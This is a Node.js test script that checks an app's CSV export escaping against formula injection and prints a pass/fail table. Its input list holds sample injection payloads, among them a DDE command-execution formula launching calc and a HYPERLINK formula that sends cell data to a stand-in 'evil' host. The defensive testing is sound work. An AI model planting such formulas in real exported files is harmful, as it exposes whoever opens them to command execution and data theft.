// TIER B2 proof (c): CSV formula-injection guard.
// Bundles the REAL src/lib/format.ts with esbuild and calls the exported
// escape function with the four dangerous inputs. No re-implementation: the
// code exercised here is exactly the code the app ships.
//
// Run: node scripts/verify-csv-guard.mjs
import { build } from 'esbuild';
import { pathToFileURL } from 'node:url';
import path from 'node:path';
import fs from 'node:fs';
import os from 'node:os';

const root = path.resolve(import.meta.dirname, '..');
const outfile = path.join(os.tmpdir(), 'aios-format-bundle.mjs');

await build({
  entryPoints: [path.join(root, 'src/lib/format.ts')],
  bundle: true,
  format: 'esm',
  platform: 'node',
  outfile,
  logLevel: 'silent',
});

const { escapeCsvCell, toCsv } = await import(pathToFileURL(outfile).href);

const inputs = [
  '=SUM(A1)',
  '+123',
  '-456',
  '@import',
  '\t=SUM(A1)',      // TAB-prefixed (Excel strips TAB, then evaluates)
  '\r=SUM(A1)',      // CR-prefixed
  '=cmd|\'/c calc\'!A1',
  '=HYPERLINK("http://evil/?d="&A1,"click")',
  'BBCA',            // benign: must NOT change
  'Rp 10.000',       // benign: must NOT change
  '-1',              // numeric negative: guarded (documented behaviour)
  '',
  null,
  undefined,
  42,
];

const DANGER = /^[=+\-@\t\r]/;
const rows = [];
let failures = 0;

for (const raw of inputs) {
  const out = escapeCsvCell(raw);
  const isDangerous = raw != null && DANGER.test(String(raw));
  // A guarded cell must (1) start with an apostrophe and therefore (2) no
  // longer start with a formula character.
  const guarded = !isDangerous || (out.startsWith("'") || out.startsWith('"\''));
  if (!guarded) failures++;
  rows.push({
    input: raw === null ? 'null' : raw === undefined ? 'undefined' : JSON.stringify(String(raw)),
    output: JSON.stringify(out),
    dangerous: isDangerous ? 'yes' : 'no',
    verdict: !isDangerous ? (out === (raw == null ? '' : String(raw)) ? 'UNCHANGED (ok)' : 'CHANGED (BAD)') : guarded ? 'ESCAPED (ok)' : 'NOT ESCAPED (FAIL)',
  });
  if (!isDangerous && out !== (raw == null ? '' : String(raw))) failures++;
}

const pad = (s, n) => String(s).padEnd(n);
console.log('=== (c) CSV injection guard — escapeCsvCell(input) ===');
console.log(pad('INPUT', 46) + pad('OUTPUT', 46) + pad('DANGER', 8) + 'VERDICT');
console.log('-'.repeat(120));
for (const r of rows) {
  console.log(pad(r.input, 46) + pad(r.output, 46) + pad(r.dangerous, 8) + r.verdict);
}

console.log('\n=== end-to-end: toCsv() over a poisoned row ===');
const csv = toCsv([{ symbol: '=SUM(A1)', qty: 10, note: '@import', price: -456 }]);
console.log(JSON.stringify(csv));
console.log(csv.split('\n').map((l) => '  ' + l).join('\n'));
const dataLine = csv.split('\n')[1];
if (!dataLine.includes("'=SUM(A1)") || !dataLine.includes("'@import") || !dataLine.includes("'-456")) {
  failures++;
  console.log('FAIL: toCsv did not guard every dangerous cell');
} else {
  console.log('PASS: every dangerous cell guarded in toCsv output');
}

fs.unlinkSync(outfile);
console.log(`\nRESULT: ${failures === 0 ? 'PASS' : 'FAIL'} (${failures} failure(s))`);
process.exit(failures === 0 ? 0 : 1);
